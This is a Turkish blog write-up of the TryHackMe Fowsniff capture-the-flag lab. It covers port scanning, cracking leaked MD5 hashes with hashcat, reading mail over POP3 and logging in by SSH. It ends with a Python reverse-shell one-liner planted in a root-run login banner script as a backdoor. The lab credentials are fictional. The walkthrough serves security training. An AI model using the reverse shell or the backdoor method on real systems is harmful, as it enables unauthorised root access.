---
title: "TryHackme | Fowsniff CTF Write-Up"
date: 2022-05-06T00:09:00+03:00
draft: false
---

Bu içerik TryHackMe platformundaki Fowsniff CTF’inin çözümünü içerir. Çözmek isteyenler için: [https://tryhackme.com/room/ctf](https://tryhackme.com/room/ctf)


Port enumeration:

`nmap -vv -A -p- -sV -o nmap_output 10.10.218.240`

nmap sonucunda

- 22 ssh
- 80 http
- 110 pop3
- 143 imap

portlarının açık olduğunu görüyorum.

Hedef makine web site yayını yapıyor. Giriyorum ama kayda değer bir şey bulamıyorum.

dirb ile siteyi tarıyorum.

![Untitled](/img/Fowsniff%20CTF%20Write-Up%20a1924688797e455cbc2b1b402aa266c6/Untitled.png)

/security.txt’ye giriyorum.

![Untitled](/img/Fowsniff%20CTF%20Write-Up%20a1924688797e455cbc2b1b402aa266c6/Untitled%201.png)

Verilen ipucundan şirket çalışanlarının emaillerinin ve hashlerinin sızdırıldığı bilgilerin pastebin’de olduğunu görüyorum.

```
FOWSNIFF CORP PASSWORD LEAK
                ''~``
               ( o o )
    +-----.oooO--(_)--Oooo.------+
    |                            |
    |          FOWSNIFF          |
    |            got             |
    |           PWN3D!!!         |
    |                            |
    |       .oooO                |
    |        (   )   Oooo.       |
    +---------\ (----(   )-------+
               \_)    ) /
                     (_/
    FowSniff Corp got pwn3d by B1gN1nj4!
    No one is safe from my 1337 skillz!
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7eFowsniff 
Corporation Passwords LEAKED!
FOWSNIFF CORP PASSWORD DUMP!
Here are their email passwords dumped from their databases.
They left their pop3 server WIDE OPEN, too!MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =Pl8r n00bz!B1gN1nj4
```

Hash tipinin MD5 olduğunu biliyorum ve buna göre hashcat ile bruteforce yaparak seina’nın parolasını kırmaya çalışıyorum.

`hashcat -a 0 -m 0 "90dc16d47114aa13671c697fd506cf26" /usr/share/wordlists/rockyou.txt -vv`

- -a 0 —> attack türümüzün dictionary attack olduğunu belirtir.
- -m 0 —> kırılacak hash tipinin MD5 olduğunu belirtir.

Bu komut sonrası parolamız kırıldı.

![Untitled](/img/Fowsniff%20CTF%20Write-Up%20a1924688797e455cbc2b1b402aa266c6/Untitled%202.png)

Elimdeki user ve pass bilgileriyle, telnet ile 110. porttan makineye bağlanıyorum ve seina’nın maillerini görüntülüyorum.

![Untitled](/img/Fowsniff%20CTF%20Write-Up%20a1924688797e455cbc2b1b402aa266c6/Untitled%203.png)

Seina’nın SSH için kullandığı geçiçi parolayı görüyorum.

`S1ck3nBluff+secureshell`

Gönderenin kullanıcı adı ve bu şifreyle ssh bağlantısı yapıyorum.

`baksteen:S1ck3nBluff+secureshell`

![Untitled](/img/Fowsniff%20CTF%20Write-Up%20a1924688797e455cbc2b1b402aa266c6/Untitled%204.png)

![Untitled](/img/Fowsniff%20CTF%20Write-Up%20a1924688797e455cbc2b1b402aa266c6/Untitled%205.png)

baksteen kullanıcısı users grubuna dahil. users grubunun çalıştıracağı dosyaları listelediğimde karşıma [cube.sh](http://cube.sh) çıkıyor.

[cube.sh](http://cube.sh)’ı nano ile açtığımda bir şey dikkatimi çekiyor.

![Untitled](/img/Fowsniff%20CTF%20Write-Up%20a1924688797e455cbc2b1b402aa266c6/Untitled%206.png)

Bu banner ssh’a bağlandığımızda karşımıza çıkan banner. Yani buradan ssh ilk açıldığında bu dosyanın çağrıldığını anlıyorum. Bu dosyanın içeriğini reverse_shell bir betik ile değiştirerek bir root olarak çalışacak backdoor oluşturabilirim.

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);’
```

[cube.sh](http://cube.sh) dosyasına bu satırı ekledikten sonra ssh bağlantısını kapatıyorum.

Çalışacak olan betiğin geleceği port 1234 ve 1234 portunu dinliyorum.

![Untitled](/img/Fowsniff%20CTF%20Write-Up%20a1924688797e455cbc2b1b402aa266c6/Untitled%207.png)

Makineye ssh ile bir kez daha bağlanıyorum ve script çalışıyor.

![Untitled](/img/Fowsniff%20CTF%20Write-Up%20a1924688797e455cbc2b1b402aa266c6/Untitled%208.png)

Yazdığım içeriği okuduğunuz için teşekkür ederim. İyi çalışmalar.
